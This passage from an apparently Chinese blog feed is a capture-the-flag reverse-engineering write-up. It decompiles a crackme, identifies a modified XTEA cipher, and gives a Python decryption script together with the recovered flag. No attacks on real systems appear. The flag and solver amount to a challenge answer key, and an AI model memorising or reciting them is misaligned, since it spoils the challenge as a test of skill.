j<span class="token punctuation">;</span> <span class="token comment">// [rsp+154h] [rbp+134h]</span>  <span class="token keyword">int</span> k<span class="token punctuation">;</span> <span class="token comment">// [rsp+174h] [rbp+154h]</span>  <span class="token keyword">int</span> m<span class="token punctuation">;</span> <span class="token comment">// [rsp+194h] [rbp+174h]</span>  v0 <span class="token operator">=</span> <span class="token operator">&amp;</span>v4<span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">102</span>i64<span class="token punctuation">;</span> i<span class="token punctuation">;</span> <span class="token operator">--</span>i <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>v0 <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">858993460</span><span class="token punctuation">;</span>    v0 <span class="token operator">+=</span> <span class="token number">4</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token function">sub_14001137F</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_140023009<span class="token punctuation">)</span><span class="token punctuation">;</span>  v5 <span class="token operator">=</span> <span class="token number">32</span><span class="token punctuation">;</span>  v6 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  v7<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1234</span><span class="token punctuation">;</span>  v7<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">5678</span><span class="token punctuation">;</span>  v7<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">9012</span><span class="token punctuation">;</span>  v7<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">3456</span><span class="token punctuation">;</span>  <span class="token function">memset</span><span class="token punctuation">(</span>v8<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x28u</span>i64<span class="token punctuation">)</span><span class="token punctuation">;</span>  v9<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  v9<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token function">sub_1400113E8</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">;</span> <span class="token operator">++</span>j <span class="token punctuation">)</span>    <span class="token function">sub_1400111FE</span><span class="token punctuation">(</span><span class="token string">"%x"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v8<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">sub_140011339</span><span class="token punctuation">(</span>v7<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">sub_140011145</span><span class="token punctuation">(</span>v8<span class="token punctuation">,</span> v9<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">sub_1400112B7</span><span class="token punctuation">(</span>v8<span class="token punctuation">,</span> v7<span class="token punctuation">)</span><span class="token punctuation">;</span>  v6 <span class="token operator">=</span> <span class="token function">sub_140011352</span><span class="token punctuation">(</span>v8<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v6 <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">sub_140011195</span><span class="token punctuation">(</span><span class="token string">"you are right\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span> k <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> k <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">;</span> <span class="token operator">++</span>k <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      <span class="token keyword">for</span> <span class="token punctuation">(</span> m <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span> m <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token operator">--</span>m <span class="token punctuation">)</span>        <span class="token function">sub_140011195</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>v9<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">>></span> <span class="token punctuation">(</span><span class="token number">8</span> <span class="token operator">*</span> m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">else</span>  <span class="token punctuation">&#123;</span>    <span class="token function">sub_140011195</span><span class="token punctuation">(</span><span class="token string">"fault!\nYou can go online and learn the tea algorithm!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token function">sub_140011311</span><span class="token punctuation">(</span>v3<span class="token punctuation">,</span> <span class="token operator">&amp;</span>unk_14001AE90<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span>i64<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="sub_1400113e8函数"><a class="markdownIt-Anchor" href="#sub_1400113e8函数"></a> sub_1400113E8函数</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 <span class="token function">sub_1400113E8</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> <span class="token function">sub_140011B00</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">sub_140011B00</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token function">sub_14001137F</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_140023009<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"This is the input format for you geting of flag hex \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"0x12345678 0x12345678 0x12345678 0x12345678 0x12345678 0x12345678 0x12345678\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"The end of flag:\nHZCTF&#123;This_is_the_fake_flag&#125;\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"input your get the flag:\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>程序运行时，打印的东西</li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">for</span> <span class="token punctuation">(</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">;</span> <span class="token operator">++</span>j <span class="token punctuation">)</span>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%x"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v8<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li>对我们的v8数组输入十六进制字符串，因为在上一个函数中，指定了我们要输入字符串的格式为hex</li></ul><h4 id="sub_140011339函数"><a class="markdownIt-Anchor" href="#sub_140011339函数"></a> sub_140011339函数</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 __fastcall <span class="token function">sub_140011339</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> <span class="token function">sub_1400117D0</span><span class="token punctuation">(</span>a1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>__int64 __fastcall <span class="token function">sub_1400117D0</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span>a1<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">char</span> <span class="token operator">*</span>v1<span class="token punctuation">;</span> <span class="token comment">// rdi</span>  __int64 i<span class="token punctuation">;</span> <span class="token comment">// rcx</span>  <span class="token keyword">char</span> v4<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-20h] BYREF</span>  <span class="token keyword">char</span> v5<span class="token punctuation">;</span> <span class="token comment">// [rsp+20h] [rbp+0h] BYREF</span>  <span class="token keyword">int</span> v6<span class="token punctuation">;</span> <span class="token comment">// [rsp+28h] [rbp+8h]</span>  <span class="token keyword">int</span> v7<span class="token punctuation">;</span> <span class="token comment">// [rsp+2Ch] [rbp+Ch]</span>  <span class="token keyword">int</span> v8<span class="token punctuation">;</span> <span class="token comment">// [rsp+30h] [rbp+10h]</span>  <span class="token keyword">int</span> v9<span class="token punctuation">;</span> <span class="token comment">// [rsp+34h] [rbp+14h]</span>  v1 <span class="token operator">=</span> <span class="token operator">&amp;</span>v5<span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">14</span>i64<span class="token punctuation">;</span> i<span class="token punctuation">;</span> <span class="token operator">--</span>i <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>v1 <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">858993460</span><span class="token punctuation">;</span>    v1 <span class="token operator">+=</span> <span class="token number">4</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token function">sub_14001137F</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_140023009<span class="token punctuation">)</span><span class="token punctuation">;</span>  v6 <span class="token operator">=</span> <span class="token number">2233</span><span class="token punctuation">;</span>  v7 <span class="token operator">=</span> <span class="token number">4455</span><span class="token punctuation">;</span>  v8 <span class="token operator">=</span> <span class="token number">6677</span><span class="token punctuation">;</span>  v9 <span class="token operator">=</span> <span class="token number">8899</span><span class="token punctuation">;</span>  <span class="token operator">*</span>a1 <span class="token operator">=</span> <span class="token number">2233</span><span class="token punctuation">;</span>  a1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> v7<span class="token punctuation">;</span>  a1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> v8<span class="token punctuation">;</span>  a1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> v9<span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">sub_140011311</span><span class="token punctuation">(</span>v4<span class="token punctuation">,</span> <span class="token operator">&amp;</span>unk_14001AD00<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>传入的参数为v7，但是在函数内部通过指针被改变了值</li><li>原来的v7值为1234,5678,9012,3456</li><li>改变后的v7值为2233,4455,6677,8899</li></ul><h4 id="sub_140011145v8-v9"><a class="markdownIt-Anchor" href="#sub_140011145v8-v9"></a> sub_140011145(v8, v9);</h4><p>代码如下:</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 __fastcall <span class="token function">sub_140011145</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> __int64 a2<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> <span class="token function">sub_140012030</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> a2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>__int64 __fastcall <span class="token function">sub_140012030</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> __int64 a2<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  __int64 result<span class="token punctuation">;</span> <span class="token comment">// rax</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [rsp+24h] [rbp+4h]</span>  result <span class="token operator">=</span> <span class="token function">sub_14001137F</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_140023009<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a2 <span class="token operator">+</span> <span class="token number">4</span>i64 <span class="token operator">*</span> i<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">4</span>i64 <span class="token operator">*</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>    result <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>传入的是v8,v9数组，实际上只是把v8数组的每个值赋给了v9</li></ul><h4 id="sub_1400112b7v8-v7"><a class="markdownIt-Anchor" href="#sub_1400112b7v8-v7"></a> sub_1400112B7(v8, v7);</h4><p>代码如下:</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 __fastcall <span class="token function">sub_1400112B7</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> __int64 a2<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> <span class="token function">sub_140011900</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> a2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>__int64 __fastcall <span class="token function">sub_140011900</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> __int64 key<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  __int64 result<span class="token punctuation">;</span> <span class="token comment">// rax</span>  <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment">// [rsp+44h] [rbp+24h]</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [rsp+64h] [rbp+44h]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment">// [rsp+84h] [rbp+64h]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> sum<span class="token punctuation">;</span> <span class="token comment">// [rsp+C4h] [rbp+A4h]</span>  result <span class="token operator">=</span> <span class="token function">sub_14001137F</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_140023009<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">8</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    v5 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    sum <span class="token operator">=</span> <span class="token number">0xF462900</span> <span class="token operator">*</span> i<span class="token punctuation">;</span>                        <span class="token comment">// sum = delta * i</span>    v3 <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">do</span>    <span class="token punctuation">&#123;</span>      <span class="token operator">++</span>v5<span class="token punctuation">;</span>      <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">4</span>i64 <span class="token operator">*</span> i<span class="token punctuation">)</span> <span class="token operator">+=</span> sum <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">4</span>i64 <span class="token operator">*</span> v3<span class="token punctuation">)</span>                                         <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">4</span>i64 <span class="token operator">*</span> v3<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token number">16</span> <span class="token operator">*</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">4</span>i64 <span class="token operator">*</span> v3<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>sum <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>key <span class="token operator">+</span> <span class="token number">4</span>i64 <span class="token operator">*</span> <span class="token punctuation">(</span>sum <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">4</span>i64 <span class="token operator">*</span> v3<span class="token punctuation">)</span> <span class="token operator">+=</span> <span class="token punctuation">(</span>sum <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>key <span class="token operator">+</span> <span class="token number">4</span>i64 <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>sum <span class="token operator">>></span> <span class="token number">11</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">4</span>i64 <span class="token operator">*</span> i<span class="token punctuation">)</span>                                                                                          <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">4</span>i64 <span class="token operator">*</span> i<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token number">16</span> <span class="token operator">*</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">4</span>i64 <span class="token operator">*</span> i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      sum <span class="token operator">+=</span> <span class="token number">0xF462900</span><span class="token punctuation">;</span>                         <span class="token comment">// sum += delta</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span> v5 <span class="token operator">&lt;=</span> <span class="token number">32</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>                         <span class="token comment">// 循环32次</span>    result <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>存在一个变量与一个固定的常数做运算，且常数不受影响，常数为0xF462900</li><li>存在移位+异或运算</li><li>存在Feistal结构，即把运算后的值相加并且给新的变量</li><li>do…while循环33次</li><li>for循环8次</li></ul><p>通过上述信息，可以初步判断这个题目是一个魔改的Xtea算法</p><p>把加密过程逆过来</p><h3 id="exp-30"><a class="markdownIt-Anchor" href="#exp-30"></a> exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">key<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">2233</span><span class="token punctuation">,</span><span class="token number">4455</span><span class="token punctuation">,</span><span class="token number">6677</span><span class="token punctuation">,</span><span class="token number">8899</span><span class="token punctuation">]</span>value<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">0x1A800BDA</span><span class="token punctuation">,</span><span class="token number">0xF7A6219B</span><span class="token punctuation">,</span><span class="token number">0x491811D8</span><span class="token punctuation">,</span><span class="token number">0xF2013328</span><span class="token punctuation">,</span><span class="token number">0x156C365B</span><span class="token punctuation">,</span><span class="token number">0x3C6EAAD8</span><span class="token punctuation">,</span><span class="token number">0x84D4BF28</span><span class="token punctuation">,</span><span class="token number">0xF11A7EE7</span><span class="token punctuation">,</span><span class="token number">0x3313B252</span><span class="token punctuation">,</span><span class="token number">0xDD9FE279</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">x_tea_decrypt</span><span class="token punctuation">(</span>value<span class="token punctuation">,</span>key<span class="token punctuation">)</span><span class="token punctuation">:</span>    delta<span class="token operator">=</span><span class="token number">256256256</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        rounds<span class="token operator">=</span><span class="token number">33</span>        <span class="token builtin">sum</span><span class="token operator">=</span>delta<span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">33</span><span class="token operator">+</span>j<span class="token punctuation">)</span> <span class="token comment">#注意i最大是8，所以还要+1</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>rounds<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token builtin">sum</span><span class="token operator">-=</span>delta            <span class="token comment">#注意这段逻辑被魔改了，做题的时候要慢慢来分析,&amp;0xfffffff模拟32位</span>            value<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">-=</span><span class="token punctuation">(</span><span class="token builtin">sum</span><span class="token operator">+</span>key<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token builtin">sum</span><span class="token operator">>></span><span class="token number">11</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token punctuation">(</span>value<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">(</span>value<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">>></span><span class="token number">5</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token punctuation">(</span>value<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            value<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span>value<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">&amp;</span><span class="token number">0xffffffff</span>            value<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-=</span><span class="token builtin">sum</span><span class="token operator">^</span><span class="token punctuation">(</span><span class="token punctuation">(</span>value<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">(</span>value<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">>></span><span class="token number">5</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token punctuation">(</span>value<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token punctuation">(</span><span class="token builtin">sum</span><span class="token operator">+</span>key<span class="token punctuation">[</span><span class="token builtin">sum</span><span class="token operator">&amp;</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            value<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>value<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">&amp;</span><span class="token number">0xffffffff</span>    <span class="token keyword">return</span> valuevalue<span class="token operator">=</span>x_tea_decrypt<span class="token punctuation">(</span>value<span class="token punctuation">,</span>key<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span>value<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">>></span><span class="token punctuation">(</span><span class="token number">8</span><span class="token operator">*</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>  <span class="token comment">#&amp;0xff模拟8位</span> <span class="token comment">#HZCTF&#123;hzCtf_94_re666fingcry5641qq&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RC4学习笔记</title>
      <link href="/2024/02/08/RC4%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2024/02/08/RC4%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
